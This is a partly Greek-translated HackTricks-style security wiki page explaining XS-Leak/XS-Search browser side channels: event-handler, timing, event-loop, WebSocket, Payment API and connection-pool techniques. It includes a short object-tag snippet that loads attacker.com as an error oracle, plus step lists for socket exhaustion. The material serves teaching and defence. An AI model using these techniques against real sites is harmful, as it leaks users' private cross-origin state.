# XS-Search/XS-Leaks

{{#include ../banners/hacktricks-training.md}}

## Basic Information

XS-Search είναι μια μέθοδος που χρησιμοποιείται για **την εξαγωγή πληροφοριών από διαφορετικές προελεύσεις** εκμεταλλευόμενη **ευπάθειες πλευρικών καναλιών**.

Τα κύρια στοιχεία που εμπλέκονται σε αυτή την επίθεση περιλαμβάνουν:

- **Ευάλωτο Διαδίκτυο**: Ο στόχος ιστότοπος από τον οποίο προορίζεται να εξαχθούν πληροφορίες.
- **Διαδίκτυο του Επιτιθέμενου**: Ο κακόβουλος ιστότοπος που δημιουργείται από τον επιτιθέμενο, τον οποίο επισκέπτεται το θύμα, φιλοξενώντας την εκμετάλλευση.
- **Μέθοδος Συμπερίληψης**: Η τεχνική που χρησιμοποιείται για να ενσωματώσει το Ευάλωτο Διαδίκτυο στο Διαδίκτυο του Επιτιθέμενου (π.χ., window.open, iframe, fetch, HTML tag με href, κ.λπ.).
- **Τεχνική Διαρροής**: Τεχνικές που χρησιμοποιούνται για να διακρίνουν διαφορές στην κατάσταση του Ευάλωτου Διαδικτύου με βάση τις πληροφορίες που συλλέγονται μέσω της μεθόδου συμπερίληψης.
- **Καταστάσεις**: Οι δύο πιθανές συνθήκες του Ευάλωτου Διαδικτύου, τις οποίες ο επιτιθέμενος στοχεύει να διακρίνει.
- **Ανιχνεύσιμες Διαφορές**: Παρατηρήσιμες παραλλαγές στις οποίες ο επιτιθέμενος βασίζεται για να συμπεράνει την κατάσταση του Ευάλωτου Διαδικτύου.

### Detectable Differences

Διάφορες πτυχές μπορούν να αναλυθούν για να διαφοροποιήσουν τις καταστάσεις του Ευάλωτου Διαδικτύου:

- **Κωδικός Κατάστασης**: Διαχωρισμός μεταξύ **διαφορετικών κωδικών κατάστασης HTTP** από διαφορετικές προελεύσεις, όπως σφάλματα διακομιστή, σφάλματα πελάτη ή σφάλματα αυθεντικοποίησης.
- **Χρήση API**: Αναγνώριση **χρήσης Web APIs** σε σελίδες, αποκαλύπτοντας αν μια σελίδα από διαφορετική προέλευση χρησιμοποιεί μια συγκεκριμένη JavaScript Web API.
- **Ανακατευθύνσεις**: Ανίχνευση πλοηγήσεων σε διαφορετικές σελίδες, όχι μόνο HTTP ανακατευθύνσεις αλλά και αυτές που ενεργοποιούνται από JavaScript ή HTML.
- **Περιεχόμενο Σελίδας**: Παρατήρηση **παραλλαγών στο σώμα της απόκρισης HTTP** ή σε υπο-πόρους της σελίδας, όπως ο **αριθμός ενσωματωμένων πλαισίων** ή διαφορές μεγέθους σε εικόνες.
- **HTTP Header**: Σημείωση της παρουσίας ή πιθανώς της τιμής ενός **συγκεκριμένου HTTP response header**, συμπεριλαμβανομένων των headers όπως X-Frame-Options, Content-Disposition και Cross-Origin-Resource-Policy.
- **Χρόνος**: Παρατήρηση σταθερών χρονικών διαφορών μεταξύ των δύο καταστάσεων.

### Inclusion Methods

- **HTML Elements**: Το HTML προσφέρει διάφορα στοιχεία για **συμπερίληψη πόρων από διαφορετικές προελεύσεις**, όπως στυλ, εικόνες ή σενάρια, αναγκάζοντας τον περιηγητή να ζητήσει έναν μη-HTML πόρο. Μια συλλογή πιθανών HTML στοιχείων για αυτό το σκοπό μπορεί να βρεθεί στο [https://github.com/cure53/HTTPLeaks](https://github.com/cure53/HTTPLeaks).
- **Frames**: Στοιχεία όπως **iframe**, **object** και **embed** μπορούν να ενσωματώσουν HTML πόρους απευθείας στη σελίδα του επιτιθέμενου. Εάν η σελίδα **λείπει προστασία πλαισίωσης**, η JavaScript μπορεί να έχει πρόσβαση στο αντικείμενο παραθύρου του πλαισίου μέσω της ιδιότητας contentWindow.
- **Pop-ups**: Η μέθοδος **`window.open`** ανοίγει έναν πόρο σε μια νέα καρτέλα ή παράθυρο, παρέχοντας μια **χειριστή παραθύρου** για την αλληλεπίδραση της JavaScript με μεθόδους και ιδιότητες σύμφωνα με το SOP. Οι αναδυόμενες οθόνες, που χρησιμοποιούνται συχνά σε διαδικασίες αυτόματης σύνδεσης, παρακάμπτουν τους περιορισμούς πλαισίωσης και cookie ενός πόρου στόχου. Ωστόσο, οι σύγχρονοι περιηγητές περιορίζουν τη δημιουργία αναδυόμενων παραθύρων σε ορισμένες ενέργειες χρηστών.
- **JavaScript Requests**: Η JavaScript επιτρέπει άμεσες αιτήσεις σε πόρους στόχου χρησιμοποιώντας **XMLHttpRequests** ή το **Fetch API**. Αυτές οι μέθοδοι προσφέρουν ακριβή έλεγχο πάνω στην αίτηση, όπως η επιλογή να ακολουθήσουν HTTP ανακατευθύνσεις.

### Leak Techniques

- **Event Handler**: Μια κλασική τεχνική διαρροής στα XS-Leaks, όπου οι χειριστές γεγονότων όπως **onload** και **onerror** παρέχουν πληροφορίες σχετικά με την επιτυχία ή αποτυχία φόρτωσης πόρων.
- **Σφάλματα**: Εξαιρέσεις JavaScript ή ειδικές σελίδες σφαλμάτων μπορούν να παρέχουν πληροφορίες διαρροής είτε άμεσα από το μήνυμα σφάλματος είτε διαχωρίζοντας την παρουσία και την απουσία του.
- **Παγκόσμιοι Περιορισμοί**: Φυσικοί περιορισμοί ενός περιηγητή, όπως η χωρητικότητα μνήμης ή άλλοι επιβεβλημένοι περιορισμοί του περιηγητή, μπορούν να σήμαναν πότε έχει φτάσει ένα όριο, λειτουργώντας ως τεχνική διαρροής.
- **Παγκόσμια Κατάσταση**: Ανιχνεύσιμες αλληλεπιδράσεις με τις **παγκόσμιες καταστάσεις** των περιηγητών (π.χ., η διεπαφή Ιστορίας) μπορούν να εκμεταλλευτούν. Για παράδειγμα, ο **αριθμός των καταχωρίσεων** στην ιστορία ενός περιηγητή μπορεί να προσφέρει ενδείξεις σχετικά με σελίδες από διαφορετικές προελεύσεις.
- **Performance API**: Αυτό το API παρέχει **λεπτομέρειες απόδοσης της τρέχουσας σελίδας**, συμπεριλαμβανομένου του χρόνου δικτύου για το έγγραφο και τους φορτωμένους πόρους, επιτρέποντας συμπεράσματα σχετικά με τους ζητούμενους πόρους.
- **Αναγνώσιμες Ιδιότητες**: Ορισμένες HTML ιδιότητες είναι **αναγνώσιμες από διαφορετικές προελεύσεις** και μπορούν να χρησιμοποιηθούν ως τεχνική διαρροής. Για παράδειγμα, η ιδιότητα `window.frame.length` επιτρέπει στη JavaScript να μετρά τα πλαίσια που περιλαμβάνονται σε μια ιστοσελίδα από διαφορετική προέλευση.

## XSinator Tool & Paper

Το XSinator είναι ένα αυτόματο εργαλείο για **έλεγχο περιηγητών έναντι αρκετών γνωστών XS-Leaks** που εξηγούνται στην εργασία του: [**https://xsinator.com/paper.pdf**](https://xsinator.com/paper.pdf)

Μπορείτε να **πρόσβαση στο εργαλείο στο** [**https://xsinator.com/**](https://xsinator.com/)

> [!WARNING]
> **Εξαιρούμενες XS-Leaks**: Αναγκαστήκαμε να εξαιρέσουμε XS-Leaks που βασίζονται σε **εργαζόμενους υπηρεσιών** καθώς θα παρεμβαίνουν σε άλλες διαρροές στο XSinator. Επιπλέον, επιλέξαμε να **εξαιρέσουμε XS-Leaks που βασίζονται σε κακή διαμόρφωση και σφάλματα σε μια συγκεκριμένη διαδικτυακή εφαρμογή**. Για παράδειγμα, κακές διαμορφώσεις CrossOrigin Resource Sharing (CORS), διαρροές postMessage ή Cross-Site Scripting. Επιπλέον, εξαιρέσαμε τις χρονικά βασισμένες XS-Leaks καθώς συχνά υποφέρουν από αργές, θορυβώδεις και ανακριβείς.

## **Timing Based techniques**

Ορισμένες από τις παρακάτω τεχνικές θα χρησιμοποιήσουν το χρόνο ως μέρος της διαδικασίας για να ανιχνεύσουν διαφορές στις πιθανές καταστάσεις των ιστοσελίδων. Υπάρχουν διάφοροι τρόποι μέτρησης του χρόνου σε έναν περιηγητή ιστού.

**Ρολόγια**: Το [performance.now()](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now) API επιτρέπει στους προγραμματιστές να αποκτούν μετρήσεις χρόνου υψηλής ανάλυσης.\
Υπάρχει ένας σημαντικός αριθμός APIs που οι επιτιθέμενοι μπορούν να καταχραστούν για να δημιουργήσουν έμμεσες ρολόγια: [Broadcast Channel API](https://developer.mozilla.org/en-US/docs/Web/API/Broadcast_Channel_API), [Message Channel API](https://developer.mozilla.org/en-US/docs/Web/API/MessageChannel), [requestAnimationFrame](https://developer.mozilla.org/en-US/docs/Web/API/window/requestAnimationFrame), [setTimeout](https://developer.mozilla.org/en-US/docs/Web/API/WindowOrWorkerGlobalScope/setTimeout), CSS animations, και άλλα.\
Για περισσότερες πληροφορίες: [https://xsleaks.dev/docs/attacks/timing-attacks/clocks](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/).

## Event Handler Techniques

### Onload/Onerror

- **Inclusion Methods**: Frames, HTML Elements
- **Detectable Difference**: Status Code
- **More info**: [https://www.usenix.org/conference/usenixsecurity19/presentation/staicu](https://www.usenix.org/conference/usenixsecurity19/presentation/staicu), [https://xsleaks.dev/docs/attacks/error-events/](https://xsleaks.dev/docs/attacks/error-events/)
- **Summary**: αν προσπαθήσετε να φορτώσετε έναν πόρο, τα γεγονότα onerror/onload ενεργοποιούνται με την επιτυχία/αποτυχία φόρτωσης του πόρου, είναι δυνατόν να καταλάβετε τον κωδικό κατάστασης.
- **Code example**: [https://xsinator.com/testing.html#Event%20Handler%20Leak%20(Script)](<https://xsinator.com/testing.html#Event%20Handler%20Leak%20(Script)>)

{{#ref}}
xs-search/cookie-bomb-+-onerror-xs-leak.md
{{#endref}}

Το παράδειγμα κώδικα προσπαθεί να **φορτώσει αντικείμενα σενάριων από JS**, αλλά **άλλα tags** όπως αντικείμενα, στυλ, εικόνες, ήχοι θα μπορούσαν επίσης να χρησιμοποιηθούν. Επιπλέον, είναι επίσης δυνατό να εισαχθεί το **tag απευθείας** και να δηλωθούν τα γεγονότα `onload` και `onerror` μέσα στο tag (αντί να τα εισάγουμε από JS).

Υπάρχει επίσης μια έκδοση αυτής της επίθεσης χωρίς σενάριο:
```html
<object data="//example.com/404">
<object data="//attacker.com/?error"></object>
</object>
```
In this case if `example.com/404` is not found `attacker.com/?error` will be loaded.

### Onload Timing

- **Inclusion Methods**: HTML Elements
- **Detectable Difference**: Timing (γενικά λόγω Περιεχομένου Σελίδας, Κωδικός Κατάστασης)
- **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events)
- **Summary:** The [**performance.now()**](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) **API** can be used to measure how much time it takes to perform a request. However, other clocks could be used, such as [**PerformanceLongTaskTiming API**](https://developer.mozilla.org/en-US/docs/Web/API/PerformanceLongTaskTiming) which can identify tasks running for more than 50ms.
- **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events) another example in:

{{#ref}}
xs-search/performance.now-example.md
{{#endref}}

#### Onload Timing + Forced Heavy Task

This technique is just like the previous one, but the **attacker** will also **force** some action to take a **relevant amount time** when the **answer is positive or negative** and measure that time.

{{#ref}}
xs-search/performance.now-+-force-heavy-task.md
{{#endref}}

### unload/beforeunload Timing

- **Inclusion Methods**: Frames
- **Detectable Difference**: Timing (γενικά λόγω Περιεχομένου Σελίδας, Κωδικός Κατάστασης)
- **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)
- **Summary:** The [SharedArrayBuffer clock](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#sharedarraybuffer-and-web-workers) can be used to measure how much time it takes to perform a request. Other clocks could be used.
- **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)

The time taken to fetch a resource can be measured by utilizing the [`unload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/unload_event) and [`beforeunload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/beforeunload_event) events. The **`beforeunload`** event is fired when the browser is about to navigate to a new page, while the **`unload`** event occurs when the navigation is actually taking place. The time difference between these two events can be calculated to determine the **duration the browser spent fetching the resource**.

### Sandboxed Frame Timing + onload <a href="#sandboxed-frame-timing-attacks" id="sandboxed-frame-timing-attacks"></a>

- **Inclusion Methods**: Frames
- **Detectable Difference**: Timing (γενικά λόγω Περιεχομένου Σελίδας, Κωδικός Κατάστασης)
- **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)
- **Summary:** The [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) API can be used to measure how much time it takes to perform a request. Other clocks could be used.
- **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)

It has been observed that in the absence of [Framing Protections](https://xsleaks.dev/docs/defenses/opt-in/xfo/), the time required for a page and its subresources to load over the network can be measured by an attacker. This measurement is typically possible because the `onload` handler of an iframe is triggered only after the completion of resource loading and JavaScript execution. To bypass the variability introduced by script execution, an attacker might employ the [`sandbox`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe) attribute within the `<iframe>`. The inclusion of this attribute restricts numerous functionalities, notably the execution of JavaScript, thereby facilitating a measurement that is predominantly influenced by network performance.
```javascript
// Example of an iframe with the sandbox attribute
<iframe src="example.html" sandbox></iframe>
```
### #ID + error + onload

- **Inclusion Methods**: Frames
- **Detectable Difference**: Page Content
- **More info**:
- **Summary**: Αν μπορείτε να κάνετε την σελίδα να εμφανίζει σφάλμα όταν προσπελάσετε το σωστό περιεχόμενο και να φορτώνει σωστά όταν προσπελάσετε οποιοδήποτε περιεχόμενο, τότε μπορείτε να δημιουργήσετε έναν βρόχο για να εξάγετε όλες τις πληροφορίες χωρίς να μετράτε τον χρόνο.
- **Code Example**:

Υποθέστε ότι μπορείτε να **εισάγετε** την **σελίδα** που έχει το **μυστικό** περιεχόμενο **μέσα σε ένα Iframe**.

Μπορείτε να **κάνετε το θύμα να αναζητήσει** το αρχείο που περιέχει "_**flag**_" χρησιμοποιώντας ένα **Iframe** (εκμεταλλευόμενοι ένα CSRF για παράδειγμα). Μέσα στο Iframe γνωρίζετε ότι το _**onload event**_ θα εκτελείται **πάντα τουλάχιστον μία φορά**. Στη συνέχεια, μπορείτε να **αλλάξετε** το **URL** του **iframe** αλλάζοντας μόνο το **περιεχόμενο** του **hash** μέσα στο URL.

Για παράδειγμα:

1. **URL1**: www.attacker.com/xssearch#try1
2. **URL2**: www.attacker.com/xssearch#try2

Αν το πρώτο URL φορτώθηκε **επιτυχώς**, τότε, όταν **αλλάξετε** το **hash** μέρος του URL, το **onload** event **δεν θα ενεργοποιηθεί** ξανά. Αλλά **αν** η σελίδα είχε κάποιο είδος **σφάλματος** κατά την **φόρτωση**, τότε, το **onload** event θα **ενεργοποιηθεί ξανά**.

Στη συνέχεια, μπορείτε να **διακρίνετε** μεταξύ μιας **σωστά** φορτωμένης σελίδας ή μιας σελίδας που έχει ένα **σφάλμα** όταν προσπελάζεται.

### Javascript Execution

- **Inclusion Methods**: Frames
- **Detectable Difference**: Page Content
- **More info**:
- **Summary:** Αν η **σελίδα** **επιστρέφει** το **ευαίσθητο** περιεχόμενο, **ή** ένα **περιεχόμενο** που μπορεί να **ελεγχθεί** από τον χρήστη. Ο χρήστης θα μπορούσε να ορίσει **έγκυρο JS κώδικα στην αρνητική περίπτωση**, να **φορτώνει** κάθε προσπάθεια μέσα σε **`<script>`** tags, έτσι σε **αρνητικές** περιπτώσεις ο **κώδικας** των επιτιθέμενων **εκτελείται**, και σε **θετικές** περιπτώσεις **τίποτα** δεν θα εκτελείται.
- **Code Example:**

{{#ref}}
xs-search/javascript-execution-xs-leak.md
{{#endref}}

### CORB - Onerror

- **Inclusion Methods**: HTML Elements
- **Detectable Difference**: Status Code & Headers
- **More info**: [https://xsleaks.dev/docs/attacks/browser-features/corb/](https://xsleaks.dev/docs/attacks/browser-features/corb/)
- **Summary**: **Cross-Origin Read Blocking (CORB)** είναι ένα μέτρο ασφαλείας που αποτρέπει τις ιστοσελίδες από το να φορτώνουν ορισμένους ευαίσθητους πόρους από άλλες προελεύσεις για να προστατεύσουν από επιθέσεις όπως το **Spectre**. Ωστόσο, οι επιτιθέμενοι μπορούν να εκμεταλλευτούν τη προστατευτική συμπεριφορά του. Όταν μια απάντηση που υπόκειται σε **CORB** επιστρέφει ένα _**CORB protected**_ `Content-Type` με `nosniff` και έναν κωδικό κατάστασης `2xx`, το **CORB** αφαιρεί το σώμα και τις κεφαλίδες της απάντησης. Οι επιτιθέμενοι που παρατηρούν αυτό μπορούν να συμπεράνουν τη συνδυασμένη **κατάσταση κωδικού** (που υποδηλώνει επιτυχία ή σφάλμα) και το `Content-Type` (που δηλώνει αν είναι προστατευμένο από **CORB**), οδηγώντας σε πιθανή διαρροή πληροφοριών.
- **Code Example:**

Ελέγξτε τον σύνδεσμο με περισσότερες πληροφορίες για περισσότερες πληροφορίες σχετικά με την επίθεση.

### onblur

- **Inclusion Methods**: Frames
- **Detectable Difference**: Page Content
- **More info**: [https://xsleaks.dev/docs/attacks/id-attribute/](https://xsleaks.dev/docs/attacks/id-attribute/), [https://xsleaks.dev/docs/attacks/experiments/portals/](https://xsleaks.dev/docs/attacks/experiments/portals/)
- **Summary**: Διαρροή ευαίσθητων δεδομένων από το id ή το όνομα χαρακτηριστικό.
- **Code Example**: [https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet](https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet)

Είναι δυνατόν να **φορτώσετε μια σελίδα** μέσα σε ένα **iframe** και να χρησιμοποιήσετε το **`#id_value`** για να κάνετε τη σελίδα να **εστιάσει στο στοιχείο** του iframe με το υποδεικνυόμενο id, στη συνέχεια αν ενεργοποιηθεί ένα σήμα **`onblur`**, το στοιχείο ID υπάρχει.\
Μπορείτε να εκτελέσετε την ίδια επίθεση με **`portal`** tags.

### postMessage Broadcasts <a href="#postmessage-broadcasts" id="postmessage-broadcasts"></a>

- **Inclusion Methods**: Frames, Pop-ups
- **Detectable Difference**: API Usage
- **More info**: [https://xsleaks.dev/docs/attacks/postmessage-broadcasts/](https://xsleaks.dev/docs/attacks/postmessage-broadcasts/)
- **Summary**: Συγκέντρωση ευαίσθητων πληροφοριών από ένα postMessage ή χρήση της παρουσίας των postMessages ως oracle για να γνωρίζετε την κατάσταση του χρήστη στη σελίδα
- **Code Example**: `Any code listening for all postMessages.`

Οι εφαρμογές χρησιμοποιούν συχνά [`postMessage` broadcasts](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage) για να επικοινωνούν μεταξύ διαφορετικών προελεύσεων. Ωστόσο, αυτή η μέθοδος μπορεί ακούσια να εκθέσει **ευαίσθητες πληροφορίες** αν η παράμετρος `targetOrigin` δεν καθοριστεί σωστά, επιτρέποντας σε οποιοδήποτε παράθυρο να λάβει τα μηνύματα. Επιπλέον, η απλή πράξη της λήψης ενός μηνύματος μπορεί να λειτουργήσει ως **oracle**; για παράδειγμα, ορισμένα μηνύματα μπορεί να αποστέλλονται μόνο σε χρήστες που είναι συνδεδεμένοι. Επομένως, η παρουσία ή η απουσία αυτών των μηνυμάτων μπορεί να αποκαλύψει πληροφορίες σχετικά με την κατάσταση ή την ταυτότητα του χρήστη, όπως αν είναι αυθεντικοποιημένος ή όχι.

## Global Limits Techniques

### WebSocket API

- **Inclusion Methods**: Frames, Pop-ups
- **Detectable Difference**: API Usage
- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
- **Summary**: Η εξάντληση του ορίου σύνδεσης WebSocket διαρρέει τον αριθμό των συνδέσεων WebSocket μιας σελίδας από άλλη προέλευση.
- **Code Example**: [https://xsinator.com/testing.html#WebSocket%20Leak%20(FF)](<https://xsinator.com/testing.html#WebSocket%20Leak%20(FF)>), [https://xsinator.com/testing.html#WebSocket%20Leak%20(GC)](<https://xsinator.com/testing.html#WebSocket%20Leak%20(GC)>)

Είναι δυνατόν να προσδιορίσετε αν, και πόσες, **συνδέσεις WebSocket χρησιμοποιεί μια στοχευμένη σελίδα**. Αυτό επιτρέπει σε έναν επιτιθέμενο να ανιχνεύσει τις καταστάσεις της εφαρμογής και να διαρρεύσει πληροφορίες που σχετίζονται με τον αριθμό των συνδέσεων WebSocket.

Αν μια **προέλευση** χρησιμοποιεί το **μέγιστο ποσό αντικειμένων σύνδεσης WebSocket**, ανεξάρτητα από την κατάσταση των συνδέσεών τους, η δημιουργία **νέων αντικειμένων θα έχει ως αποτέλεσμα εξαιρέσεις JavaScript**. Για να εκτελέσετε αυτήν την επίθεση, η ιστοσελίδα του επιτιθέμενου ανοίγει την στοχευμένη ιστοσελίδα σε ένα αναδυόμενο παράθυρο ή iframe και στη συνέχεια, αφού έχει φορτωθεί η στοχευμένη ιστοσελίδα, προσπαθεί να δημιουργήσει τον μέγιστο αριθμό συνδέσεων WebSocket που είναι δυνατές. Ο **αριθμός των εξαιρέσεων που ρίχνονται** είναι ο **αριθμός των συνδέσεων WebSocket που χρησιμοποιούνται από την στοχευμένη ιστοσελίδα**.

### Payment API

- **Inclusion Methods**: Frames, Pop-ups
- **Detectable Difference**: API Usage
- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
- **Summary**: Ανίχνευση αιτήματος πληρωμής επειδή μόνο ένα μπορεί να είναι ενεργό τη φορά.
- **Code Example**: [https://xsinator.com/testing.html#Payment%20API%20Leak](https://xsinator.com/testing.html#Payment%20API%20Leak)

Αυτή η XS-Leak επιτρέπει σε έναν επιτιθέμενο να **ανιχνεύσει πότε μια σελίδα από άλλη προέλευση ξεκινά ένα αίτημα πληρωμής**.

Επειδή **μόνο ένα αίτημα πληρωμής μπορεί να είναι ενεργό** τη φορά, αν η στοχευμένη ιστοσελίδα χρησιμοποιεί το Payment Request API, οποιαδήποτε περαιτέρω προσπάθεια να χρησιμοποιήσει αυτό το API θα αποτύχει και θα προκαλέσει μια **εξαίρεση JavaScript**. Ο επιτιθέμενος μπορεί να εκμεταλλευτεί αυτό προσπαθώντας **περιοδικά να εμφανίσει το UI του Payment API**. Αν μια προσπάθεια προκαλέσει μια εξαίρεση, η στοχευμένη ιστοσελίδα το χρησιμοποιεί αυτή τη στιγμή. Ο επιτιθέμενος μπορεί να κρύψει αυτές τις περιοδικές προσπάθειες κλείνοντας αμέσως το UI μετά τη δημιουργία του.

### Timing the Event Loop <a href="#timing-the-event-loop" id="timing-the-event-loop"></a>

- **Inclusion Methods**:
- **Detectable Difference**: Timing (γενικά λόγω Περιεχομένου Σελίδας, Κωδικός Κατάστασης)
- **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop)
- **Summary:** Μετρήστε τον χρόνο εκτέλεσης ενός ιστού εκμεταλλευόμενοι τον μονόνημα JS event loop.
- **Code Example**:

{{#ref}}
xs-search/event-loop-blocking-+-lazy-images.md
{{#endref}}

Η JavaScript λειτουργεί σε ένα [μονόνημα event loop](https://developer.mozilla.org/en-US/docs/Web/JavaScript/EventLoop) μοντέλο ταυτόχρονης εκτέλεσης, υποδηλώνοντας ότι **μπορεί να εκτελεί μόνο μία εργασία τη φορά**. Αυτή η χαρακτηριστική μπορεί να εκμεταλλευτεί για να μετρήσει **πόσο χρόνο χρειάζεται ο κώδικας από μια διαφορετική προέλευση για να εκτελεστεί**. Ένας επιτιθέμενος μπορεί να μετρήσει τον χρόνο εκτέλεσης του δικού του κώδικα στο event loop αποστέλλοντας συνεχώς γεγονότα με σταθερές ιδιότητες. Αυτά τα γεγονότα θα επεξεργαστούν όταν η δεξαμενή γεγονότων είναι άδεια. Αν και άλλες προελεύσεις αποστέλλουν επίσης γεγονότα στην ίδια δεξαμενή, ένας **επιτιθέμενος μπορεί να συμπεράνει τον χρόνο που χρειάζεται για να εκτελούνται αυτά τα εξωτερικά γεγονότα παρατηρώντας καθυστερήσεις στην εκτέλεση των δικών του εργασιών**. Αυτή η μέθοδος παρακολούθησης του event loop για καθυστερήσεις μπορεί να αποκαλύψει τον χρόνο εκτέλεσης του κώδικα από διαφορετικές προελεύσεις, ενδεχομένως εκθέτοντας ευαίσθητες πληροφορίες.

> [!WARNING]
> Σε μια εκτέλεση χρονομέτρησης είναι δυνατόν να **εξαλείψετε** **παράγοντες δικτύου** για να αποκτήσετε **πιο ακριβείς μετρήσεις**. Για παράδειγμα, φορτώνοντας τους πόρους που χρησιμοποιούνται από τη σελίδα πριν την φορτώσετε.

### Busy Event Loop <a href="#busy-event-loop" id="busy-event-loop"></a>

- **Inclusion Methods**:
- **Detectable Difference**: Timing (γενικά λόγω Περιεχομένου Σελίδας, Κωδικός Κατάστασης)
- **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop)
- **Summary:** Μια μέθοδος για να μετρήσετε τον χρόνο εκτέλεσης μιας διαδικασίας ιστού περιλαμβάνει σκόπιμα το μπλοκάρισμα του event loop ενός νήματος και στη συνέχεια το χρονομέτρηση **πόσο χρόνο χρειάζεται για να γίνει ξανά διαθέσιμο το event loop**. Εισάγοντας μια μπλοκαρισμένη λειτουργία (όπως μια μακρά υπολογιστική διαδικασία ή μια συγχρονισμένη κλήση API) στο event loop και παρακολουθώντας τον χρόνο που χρειάζεται για να αρχίσει η εκτέλεση του επόμενου κώδικα, μπορεί κανείς να συμπεράνει τη διάρκεια των εργασιών που εκτελούνταν στο event loop κατά την περίοδο μπλοκαρίσματος. Αυτή η τεχνική εκμεταλλεύεται τη μονόνημη φύση του event loop της JavaScript, όπου οι εργασίες εκτελούνται διαδοχικά, και μπορεί να παρέχει πληροφορίες σχετικά με την απόδοση ή τη συμπεριφορά άλλων λειτουργιών που μοιράζονται το ίδιο νήμα.
- **Code Example**:

Ένα σημαντικό πλεονέκτημα της τεχνικής μέτρησης του χρόνου εκτέλεσης κλειδώνοντας το event loop είναι η δυνατότητά της να παρακάμψει **Site Isolation**. **Site Isolation** είναι ένα χαρακτηριστικό ασφαλείας που χωρίζει διαφορετικές ιστοσελίδες σε ξεχωριστές διαδικασίες, με στόχο να αποτρέψει κακόβουλες ιστοσελίδες από το να έχουν άμεση πρόσβαση σε ευαίσθητα δεδομένα από άλλες ιστοσελίδες. Ωστόσο, επηρεάζοντας το χρόνο εκτέλεσης μιας άλλης προέλευσης μέσω του κοινόχρηστου event loop, ένας επιτιθέμενος μπορεί έμμεσα να εξάγει πληροφορίες σχετικά με τις δραστηριότητες αυτής της προέλευσης. Αυτή η μέθοδος δεν βασίζεται σε άμεση πρόσβαση στα δεδομένα της άλλης προέλευσης αλλά παρατηρεί την επίδραση των δραστηριοτήτων αυτής της προέλευσης στο κοινόχρηστο event loop, αποφεύγοντας έτσι τα προστατευτικά εμπόδια που έχουν καθοριστεί από το **Site Isolation**.

> [!WARNING]
> Σε μια εκτέλεση χρονομέτρησης είναι δυνατόν να **εξαλείψετε** **παράγοντες δικτύου** για να αποκτήσετε **πιο ακριβείς μετρήσεις**. Για παράδειγμα, φορτώνοντας τους πόρους που χρησιμοποιούνται από τη σελίδα πριν την φορτώσετε.

### Connection Pool

- **Inclusion Methods**: JavaScript Requests
- **Detectable Difference**: Timing (γενικά λόγω Περιεχομένου Σελίδας, Κωδικός Κατάστασης)
- **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/)
- **Summary:** Ένας επιτιθέμενος θα μπορούσε να κλειδώσει όλους τους υποδοχείς εκτός από 1, να φορτώσει τον στοχευμένο ιστό και ταυτόχρονα να φορτώσει μια άλλη σελίδα, ο χρόνος μέχρι να αρχίσει να φορτώνει η τελευταία σελίδα είναι ο χρόνος που χρειάστηκε η στοχευμένη σελίδα για να φορτωθεί.
- **Code Example**:

{{#ref}}
xs-search/connection-pool-example.md
{{#endref}}

Οι περιηγητές χρησιμοποιούν υποδοχείς για την επικοινωνία με τον διακομιστή, αλλά λόγω των περιορισμένων πόρων του λειτουργικού συστήματος και του υλικού, **οι περιηγητές υποχρεούνται να επιβάλλουν ένα όριο** στον αριθμό των ταυτόχρονων υποδοχέων. Οι επιτιθέμενοι μπορούν να εκμεταλλευτούν αυτόν τον περιορισμό μέσω των εξής βημάτων:

1. Προσδιορίστε το όριο υποδοχέων του περιηγητή, για παράδειγμα, 256 παγκόσμιους υποδοχείς.
2. Καταλάβετε 255 υποδοχείς για παρατεταμένη διάρκεια ξεκινώντας 255 αιτήσεις σε διάφορους διακομιστές, σχεδιασμένες να κρατούν τις συνδέσεις ανοιχτές χωρίς να ολοκληρώνονται.
3. Χρησιμοποιήστε τον 256ο υποδοχέα για να στείλετε μια αίτηση στη στοχευμένη σελίδα.
